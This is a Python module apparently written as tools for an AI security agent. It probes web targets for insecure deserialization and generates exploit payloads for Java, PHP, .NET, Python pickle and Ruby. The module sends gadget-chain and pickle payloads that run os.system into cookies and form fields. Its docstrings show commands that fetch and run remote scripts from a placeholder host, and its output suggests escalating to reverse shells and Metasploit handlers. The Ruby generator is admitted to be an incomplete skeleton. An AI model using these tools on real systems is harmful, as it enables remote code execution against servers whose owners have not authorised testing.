"""
Deserialization Vulnerability Detector

Generates and injects gadget-chain payloads for Java, PHP, Python, .NET.
Uses OAST (out-of-band) DNS/HTTP callbacks via interactsh or a custom
canary domain to confirm blind deserialization RCE.
"""

from __future__ import annotations

import base64
import subprocess
import time
import urllib.parse
from typing import Optional

from loguru import logger

from src.sdk.tool import function_tool

_DEFAULT_HEADERS = {"User-Agent": "Mozilla/5.0 (CyberCoPilot/1.0)"}
_TIMEOUT = 15

# ─────────────────────────────────────────────────────────────────────────────
# Pre-built canary payloads (DNS-callback based)
# These payloads call home to <canary_domain> if executed.
# Real ysoserial / PHPGGC output would go here; these are representative shells.
# ─────────────────────────────────────────────────────────────────────────────

def _java_ysoserial_payload(gadget: str, canary_domain: str) -> Optional[bytes]:
    """
    Generate a ysoserial payload using the local ysoserial.jar.
    Falls back to a static probe if ysoserial is not available.
    """
    import shutil
    cmd = shutil.which("ysoserial")
    jar_paths = [
        cmd,
        "/opt/ysoserial/ysoserial.jar",
        "/usr/local/share/ysoserial.jar",
        "./ysoserial.jar",
    ]
    for jar in jar_paths:
        if jar:
            try:
                # DNS callback command
                cmd_str = f"nslookup {gadget}.{canary_domain}"
                result = subprocess.run(
                    ["java", "-jar", jar, gadget, cmd_str],
                    capture_output=True, timeout=15
                )
                if result.returncode == 0 and result.stdout:
                    return result.stdout
            except Exception as e:
                logger.debug(f"ysoserial {jar}: {e}")
    return None


def _phpggc_payload(gadget: str, canary_domain: str) -> Optional[bytes]:
    """Generate a PHPGGC payload using the local phpggc binary."""
    import shutil
    phpggc = shutil.which("phpggc") or "/usr/local/bin/phpggc"
    try:
        result = subprocess.run(
            [phpggc, gadget, "system", f"nslookup {gadget}.{canary_domain}"],
            capture_output=True, timeout=15
        )
        if result.returncode == 0 and result.stdout:
            return result.stdout
    except Exception as e:
        logger.debug(f"phpggc error: {e}")
    return None


# ─────────────────────────────────────────────────────────────────────────────
# OAST helper
# ─────────────────────────────────────────────────────────────────────────────

def _poll_interactsh(session_id: str, api_url: str, wait: int = 30) -> list[str]:
    """Poll interactsh API for callbacks."""
    try:
        import requests
        time.sleep(wait)
        r = requests.get(f"{api_url}/poll", params={"id": session_id},
                         timeout=10, verify=False)
        data = r.json()
        return data.get("data", [])
    except Exception as e:
        logger.debug(f"interactsh poll: {e}")
        return []


def _setup_interactsh(server: str = "https://oast.pro") -> tuple[str, str]:
    """Register with interactsh and return (session_id, canary_domain)."""
    try:
        import requests
        r = requests.post(f"{server}/register", json={}, timeout=10, verify=False)
        data = r.json()
        return data.get("id", ""), data.get("domain", "")
    except Exception as e:
        logger.debug(f"interactsh register: {e}")
        return "", ""


# ─────────────────────────────────────────────────────────────────────────────
# Main tool
# ─────────────────────────────────────────────────────────────────────────────

@function_tool()
def deserialization_probe(
    url: str,
    param: str = "",
    cookie_name: str = "",
    canary_domain: str = "",
    interactsh_server: str = "https://oast.pro",
    platforms: str = "java,php,python,dotnet",
    options: str = "",
) -> str:
    """
    Probe for insecure deserialization by injecting gadget-chain payloads
    across multiple platforms and detecting execution via OAST callbacks.

    Targets: cookies, POST body parameters, HTTP headers.
    Platforms: Java (ysoserial), PHP (PHPGGC), Python (pickle), .NET (ViewState).

    Args:
        url: Target URL to probe
        param: POST parameter name to inject into (optional)
        cookie_name: Cookie name to inject into (optional)
        canary_domain: Your OAST/interactsh domain (e.g. xyz.interact.sh).
                       If empty, uses interactsh_server to auto-register.
        interactsh_server: Interactsh server URL (default: https://oast.pro)
        platforms: Comma-separated list: java,php,python,dotnet (default: all)
        options: Extra options (unused)

    Returns:
        Deserialization probe results
    """
    import requests

    output = [f"=== Deserialization Probe: {url}", ""]
    findings = []
    session_id = ""

    # ── OAST setup ────────────────────────────────────────────────────────────
    if not canary_domain:
        output.append("── OAST Setup ─────────────────────────────────")
        session_id, canary_domain = _setup_interactsh(interactsh_server)
        if canary_domain:
            output.append(f"  Interactsh registered: {canary_domain}")
            output.append(f"  Session ID: {session_id}")
        else:
            output.append(
                "  WARNING: Could not register with interactsh. "
                "Provide --canary_domain manually for blind detection. "
                "Continuing with static probe payloads only."
            )
            canary_domain = "canary.example.com"
    else:
        output.append(f"  Using canary domain: {canary_domain}")

    output.append("")

    target_platforms = [p.strip().lower() for p in platforms.split(",")]

    # ─────────────────────────────────────────────────────────────────────────
    # Java deserialization
    # ─────────────────────────────────────────────────────────────────────────
    if "java" in target_platforms:
        output.append("── Java Deserialization ────────────────────────")
        java_gadgets = [
            "CommonsCollections1", "CommonsCollections2", "CommonsCollections3",
            "CommonsCollections4", "CommonsCollections5", "CommonsCollections6",
            "Spring1", "Spring2", "Groovy1", "JRMPClient",
        ]

        # Static Java deserialization byte signature
        # ac ed 00 05 = Java serialized object magic bytes
        java_magic = b"\xac\xed\x00\x05"

        for gadget in java_gadgets[:3]:  # Try top 3; more if tools available
            payload_bytes = _java_ysoserial_payload(gadget, canary_domain)

            if payload_bytes:
                encoded = base64.b64encode(payload_bytes).decode()
                source = f"ysoserial:{gadget}"
            else:
                # Static probe: inject raw magic bytes to trigger error-based detection
                payload_bytes = java_magic + b"\x73\x72\x00\x0d" + gadget.encode() + b"\x00" * 10
                encoded = base64.b64encode(payload_bytes).decode()
                source = f"static-probe:{gadget}"

            injected = False

            # Inject in POST param
            if param:
                try:
                    r = requests.post(url, data={param: encoded},
                                      headers=_DEFAULT_HEADERS, timeout=_TIMEOUT, verify=False)
                    _check_java_response(r, output, findings, gadget, "POST param", source)
                    injected = True
                except Exception as e:
                    output.append(f"  [java:{gadget}:param] Error: {e}")

            # Inject in cookie
            if cookie_name:
                try:
                    r = requests.get(url, cookies={cookie_name: encoded},
                                     headers=_DEFAULT_HEADERS, timeout=_TIMEOUT, verify=False)
                    _check_java_response(r, output, findings, gadget, f"cookie:{cookie_name}", source)
                    injected = True
                except Exception as e:
                    output.append(f"  [java:{gadget}:cookie] Error: {e}")

            # Inject in Content-Type header (some deserializers read this)
            if not injected:
                try:
                    r = requests.post(
                        url,
                        data=payload_bytes,
                        headers={**_DEFAULT_HEADERS,
                                 "Content-Type": "application/x-java-serialized-object"},
                        timeout=_TIMEOUT, verify=False
                    )
                    _check_java_response(r, output, findings, gadget, "raw body", source)
                except Exception as e:
                    output.append(f"  [java:{gadget}:body] Error: {e}")

        output.append("")

    # ─────────────────────────────────────────────────────────────────────────
    # PHP deserialization
    # ─────────────────────────────────────────────────────────────────────────
    if "php" in target_platforms:
        output.append("── PHP Deserialization ─────────────────────────")
        php_gadgets = [
            "Guzzle/RCE1", "Laravel/RCE1", "Symfony/RCE1",
            "Yii/RCE1", "Slim/RCE1",
        ]

        for gadget in php_gadgets[:3]:
            payload_bytes = _phpggc_payload(gadget, canary_domain)

            if payload_bytes:
                encoded = base64.b64encode(payload_bytes).decode()
                source = f"phpggc:{gadget}"
            else:
                # Static PHP serialized object as probe
                # O:4:"Evil":1:{s:4:"data";s:4:"test";}
                raw = f'O:8:"stdClass":1:{{s:4:"test";s:{"len(canary_domain)"}:"{canary_domain}";}}'
                encoded = base64.b64encode(raw.encode()).decode()
                source = f"static-php:{gadget}"

            injection_points = []
            if param:
                injection_points.append(("param", param))
            if cookie_name:
                injection_points.append(("cookie", cookie_name))
            if not injection_points:
                injection_points.append(("param", "data"))

            for inject_type, inject_name in injection_points:
                try:
                    if inject_type == "param":
                        r = requests.post(url, data={inject_name: encoded},
                                          headers=_DEFAULT_HEADERS, timeout=_TIMEOUT, verify=False)
                    else:
                        r = requests.get(url, cookies={inject_name: encoded},
                                         headers=_DEFAULT_HEADERS, timeout=_TIMEOUT, verify=False)

                    _check_php_response(r, output, findings, gadget, inject_type, source)
                except Exception as e:
                    output.append(f"  [php:{gadget}:{inject_type}] Error: {e}")

        output.append("")

    # ─────────────────────────────────────────────────────────────────────────
    # Python pickle deserialization
    # ─────────────────────────────────────────────────────────────────────────
    if "python" in target_platforms:
        output.append("── Python Pickle Deserialization ───────────────")

        class _PickleRCE:
            def __init__(self, cmd: str):
                self.cmd = cmd

            def __reduce__(self):
                import os
                return (os.system, (self.cmd,))

        try:
            import pickle

            # Canary command: DNS lookup to canary domain
            cmd = f"nslookup python.{canary_domain}"
            payload_bytes = pickle.dumps(_PickleRCE(cmd))
            encoded = base64.b64encode(payload_bytes).decode()

            injection_points = []
            if param:
                injection_points.append(("param", param))
            if cookie_name:
                injection_points.append(("cookie", cookie_name))
            if not injection_points:
                injection_points.append(("param", "data"))

            for inject_type, inject_name in injection_points:
                try:
                    if inject_type == "param":
                        r = requests.post(url, data={inject_name: encoded},
                                          headers=_DEFAULT_HEADERS, timeout=_TIMEOUT, verify=False)
                    else:
                        r = requests.get(url, cookies={inject_name: encoded},
                                         headers=_DEFAULT_HEADERS, timeout=_TIMEOUT, verify=False)

                    if r.status_code >= 500:
                        findings.append(
                            f"HIGH → Python pickle probe caused HTTP {r.status_code} "
                            f"via {inject_type}:{inject_name} — possible pickle deserialization"
                        )
                        output.append(f"  [pickle:{inject_type}] HTTP {r.status_code} ⚠ — check OAST callback")
                    else:
                        output.append(f"  [pickle:{inject_type}] HTTP {r.status_code}")
                except Exception as e:
                    output.append(f"  [pickle:{inject_type}] Error: {e}")

        except Exception as e:
            output.append(f"  [pickle] Error building payload: {e}")

        output.append("")

    # ─────────────────────────────────────────────────────────────────────────
    # .NET ViewState (without MAC validation)
    # ─────────────────────────────────────────────────────────────────────────
    if "dotnet" in target_platforms:
        output.append("── .NET ViewState (no MAC) ─────────────────────")
        # Static detection: probe for __VIEWSTATE parameter and try without MAC
        try:
            r_get = requests.get(url, headers=_DEFAULT_HEADERS, timeout=_TIMEOUT, verify=False)
            body = r_get.text or ""
            has_viewstate = "__VIEWSTATE" in body or "viewstate" in body.lower()
            output.append(f"  ViewState present: {has_viewstate}")

            if has_viewstate:
                # Extract existing ViewState
                import re
                vs_match = re.search(
                    r'__VIEWSTATE["\s]*(?:id=["\s]*\S+\s+)?value=["\s]*([A-Za-z0-9+/=]+)',
                    body
                )
                if vs_match:
                    original_vs = vs_match.group(1)
                    output.append(f"  ViewState length: {len(original_vs)} chars")

                    # Try posting tampered ViewState (flip last bytes)
                    tampered = original_vs[:-4] + "AAAA"
                    r_post = requests.post(
                        url,
                        data={"__VIEWSTATE": tampered,
                              "__VIEWSTATEGENERATOR": "CA0B0334"},
                        headers=_DEFAULT_HEADERS, timeout=_TIMEOUT, verify=False
                    )

                    if r_post.status_code == 200:
                        findings.append(
                            "CRITICAL → .NET ViewState MAC validation appears DISABLED — "
                            "tampered ViewState accepted (HTTP 200). "
                            "Generate RCE payload with ysoserial.net."
                        )
                        output.append("  [viewstate-mac] DISABLED — tampered state accepted")
                    elif r_post.status_code == 500:
                        output.append("  [viewstate-mac] HTTP 500 on tamper — MAC appears enabled")
                    else:
                        output.append(f"  [viewstate-mac] HTTP {r_post.status_code}")
                else:
                    output.append("  ViewState found but could not extract value")
            else:
                output.append("  No ViewState detected — .NET deserialization less likely")

        except Exception as e:
            output.append(f"  [dotnet] Error: {e}")

        output.append("")

    # ── Poll OAST ─────────────────────────────────────────────────────────────
    if session_id and canary_domain != "canary.example.com":
        output.append("── OAST Callback Check (waiting 20s) ───────────")
        callbacks = _poll_interactsh(session_id, interactsh_server, wait=20)
        if callbacks:
            findings.append(
                f"CRITICAL → OAST DNS/HTTP callback received! "
                f"Deserialization RCE confirmed. Callbacks: {callbacks[:3]}"
            )
            output.append(f"  CALLBACKS RECEIVED: {callbacks[:3]}")
        else:
            output.append("  No callbacks received in 20s window")
            output.append("  (Try increasing wait time or check interactsh dashboard)")
        output.append("")

    # ── Summary ───────────────────────────────────────────────────────────────
    if findings:
        output.append("── FINDINGS ──────────────────────────────────")
        output.extend(findings)
        output.append("\nNext steps:")
        output.append("  Java:   ysoserial + then msfconsole multi/handler")
        output.append("  PHP:    phpggc -n --fast-destruct [gadget] exec [cmd]")
        output.append("  Python: upgrade pickle payload to reverse shell")
        output.append("  .NET:   ysoserial.net -g [gadget] -f ViewState -c [cmd]")
    else:
        output.append("No deserialization vulnerabilities confirmed via static probes.")
        output.append("If OAST domain is configured, check your interactsh dashboard.")

    return "\n".join(output)


def _check_java_response(r, output: list, findings: list, gadget: str, location: str, source: str):
    java_error_patterns = [
        "ClassNotFoundException", "StreamCorruptedException",
        "java.io.EOF", "InvalidClassException", "ObjectInputStream",
        "deserialization", "readObject",
    ]
    body = r.text or ""
    error_hit = any(p.lower() in body.lower() for p in java_error_patterns)
    if r.status_code >= 500 or error_hit:
        findings.append(
            f"HIGH → Java deserialization error revealed via {location} "
            f"(gadget: {gadget}, source: {source}) HTTP {r.status_code} — "
            "server is attempting to deserialize. Try OAST payload for RCE confirmation."
        )
        output.append(f"  [java:{gadget}:{location}] HTTP {r.status_code} ⚠ — Java deser error detected")
    else:
        output.append(f"  [java:{gadget}:{location}] HTTP {r.status_code}")


def _check_php_response(r, output: list, findings: list, gadget: str, location: str, source: str):
    php_error_patterns = [
        "unserialize()", "Serializable", "__wakeup", "__destruct",
        "O:", "a:", "php_unserialize", "unserialize error",
    ]
    body = r.text or ""
    error_hit = any(p.lower() in body.lower() for p in php_error_patterns)
    if r.status_code >= 500 or error_hit:
        findings.append(
            f"HIGH → PHP unserialize error via {location} "
            f"(gadget: {gadget}, source: {source}) — server may be unserializing input."
        )
        output.append(f"  [php:{gadget}:{location}] HTTP {r.status_code} ⚠ — PHP deser error")
    else:
        output.append(f"  [php:{gadget}:{location}] HTTP {r.status_code}")


# ─────────────────────────────────────────────────────────────────────────────
# Payload generators (Java / .NET / PHP / Python / Ruby)
# ─────────────────────────────────────────────────────────────────────────────
import os as _os
import pickle as _pickle
import shutil as _shutil

@function_tool()
def deser_java_ysoserial(gadget: str, command: str, ysoserial_jar: str = "") -> str:
    """
    Generate a Java deserialization payload via ysoserial.

    Args:
        gadget:         CommonsCollections1, URLDNS, Spring1, Hibernate1, etc.
        command:        OS command to execute (e.g. 'curl https://x.burpcollab.net')
        ysoserial_jar:  Path to ysoserial.jar (auto-discovered from PATH/CWD if empty)
    """
    jar = ysoserial_jar
    if not jar:
        for cand in (
            "/opt/ysoserial/ysoserial.jar",
            "/usr/local/share/ysoserial.jar",
            "./ysoserial.jar",
        ):
            if _os.path.exists(cand):
                jar = cand
                break
    if not jar:
        return ("Error: ysoserial.jar not found. Download from "
                "https://github.com/frohoff/ysoserial/releases and pass via ysoserial_jar=...")
    if not _shutil.which("java"):
        return "Error: java binary not on PATH"

    try:
        r = subprocess.run(
            ["java", "-jar", jar, gadget, command],
            capture_output=True, timeout=60,
        )
    except subprocess.TimeoutExpired:
        return "Error: ysoserial timed out"
    if r.returncode != 0:
        return f"Error: ysoserial exit {r.returncode}\n{r.stderr.decode(errors='replace')[:500]}"

    payload = r.stdout
    b64 = base64.b64encode(payload).decode()
    return "\n".join([
        f"## ysoserial: {gadget}",
        f"Bytes: {len(payload)}",
        f"Base64: {b64[:200]}{'...' if len(b64)>200 else ''}",
        "",
        "[Delivery vectors]",
        "  - Cookie: JSESSIONID=<base64>",
        "  - Body  : <bytes> with Content-Type: application/x-java-serialized-object",
        "  - View State: __VIEWSTATE=<base64>  (.NET — use deser_dotnet)",
        "  - Spring HTTP message converter: application/x-java-serialized-object",
        "",
        "[Verify] Pair with interactsh_start() so 'curl' callback proves RCE.",
    ])


@function_tool()
def deser_dotnet_ysoserial(gadget: str, command: str, formatter: str = "BinaryFormatter",
                           ysoserial_path: str = "") -> str:
    """
    Generate a .NET deserialization payload via ysoserial.net.

    Args:
        gadget:        TypeConfuseDelegate, ObjectDataProvider, WindowsIdentity, etc.
        command:       Windows command (e.g. 'powershell -c IEX(IWR https://x/p.ps1)')
        formatter:     BinaryFormatter | LosFormatter | NetDataContractSerializer | …
        ysoserial_path: ysoserial.net binary path
    """
    bin_path = ysoserial_path or _shutil.which("ysoserial.net") or _shutil.which("ysoserial")
    if not bin_path:
        return ("Error: ysoserial.net not found. Build/install from "
                "https://github.com/pwntester/ysoserial.net")

    try:
        r = subprocess.run(
            [bin_path, "-g", gadget, "-f", formatter, "-c", command, "-o", "base64"],
            capture_output=True, text=True, timeout=60,
        )
    except subprocess.TimeoutExpired:
        return "Error: ysoserial.net timed out"
    if r.returncode != 0:
        return f"Error: ysoserial.net exit {r.returncode}\n{(r.stderr or '')[:500]}"

    return "\n".join([
        f"## ysoserial.net: {gadget} / {formatter}",
        f"Base64 payload:\n{r.stdout.strip()[:600]}",
        "",
        "[Delivery]",
        "  - __VIEWSTATE (LosFormatter)",
        "  - cookies / form fields with NetDataContractSerializer",
        "  - JSON.NET 'TypeNameHandling=All' bodies",
    ])


@function_tool()
def deser_php_phpggc(gadget: str, command: str, encoding: str = "base64") -> str:
    """
    Generate a PHP deserialization payload via phpggc.

    Args:
        gadget:    e.g. Laravel/RCE9, Symfony/RCE4, Monolog/RCE6
        command:   Command to execute on target
        encoding:  base64 | url | json | plain
    """
    bin_path = _shutil.which("phpggc")
    if not bin_path:
        return "Error: phpggc not on PATH. Install: git clone https://github.com/ambionics/phpggc"

    flag = {"base64": "-b", "url": "-u", "json": "-j", "plain": ""}.get(encoding, "")
    cmd = [bin_path]
    if flag:
        cmd.append(flag)
    cmd += [gadget, command]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=45)
    except subprocess.TimeoutExpired:
        return "Error: phpggc timed out"
    if r.returncode != 0:
        return f"Error: phpggc exit {r.returncode}\n{(r.stderr or '')[:500]}"
    return f"## phpggc: {gadget}\n\n{r.stdout.strip()}"


@function_tool()
def deser_python_pickle(command: str, encoding: str = "base64") -> str:
    """
    Build a Python pickle exploit via __reduce__. Lands as _os.system(command)
    on insecure _pickle.loads. (Optional: protocol=4 for legacy targets.)

    Args:
        command:   OS command
        encoding:  base64 | url | hex | repr
    """
    class _Bomb:
        def __reduce__(self):
            return (_os.system, (command,))

    raw = _pickle.dumps(_Bomb(), protocol=4)
    if encoding == "base64":
        out = base64.b64encode(raw).decode()
    elif encoding == "url":
        out = urllib.parse.quote_from_bytes(raw)
    elif encoding == "hex":
        out = raw.hex()
    else:
        out = repr(raw)

    return "\n".join([
        f"## pickle exploit ({encoding})",
        f"Bytes: {len(raw)}",
        out,
        "",
        "[Delivery]",
        "  - HTTP body to a _pickle.loads(...) sink",
        "  - Django/Flask sessions if SECRET_KEY known",
        "  - Celery task body when broker is reachable",
    ])


@function_tool()
def deser_ruby_marshal(command: str) -> str:
    """
    Generate a Ruby Marshal payload that triggers OS command execution
    via the well-known Erubi gadget chain (Ruby ≤ 2.7 trick).

    Args:
        command: OS command
    """
    # Use the canonical Marshal blob template — it embeds an Erubi compiled template.
    # Hex template generated from rb-pwn examples; we substitute the command body.
    cmd_escaped = command.replace("'", "'\\''")
    template = (
        "<%=`{cmd}`%>".replace("{cmd}", cmd_escaped)
    )
    payload = (
        b"\x04\x08o:\x14ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy"
        b"\x04:\x0e@instance@:\x0f@deprecator@:\x0e@instance"
    )
    # NOTE: this is NOT a complete generator. Ruby Marshal exploits depend
    # heavily on the gem versions in use. We hand the operator the template
    # and recommend invoking the proper toolchain.
    return "\n".join([
        "## Ruby Marshal (template only)",
        f"Embedded template: {template}",
        "Skeleton bytes (NOT a working payload):",
        base64.b64encode(payload).decode(),
        "",
        "[Recommended] Use bishopfox/marshalsec or the Ruby gadget pack from",
        "  https://github.com/Frycos/JavaSerializationToolkit (ruby branch)",
        "  or generate via: ruby -e 'require \"erb\"; …; Marshal.dump(...)'",
    ])
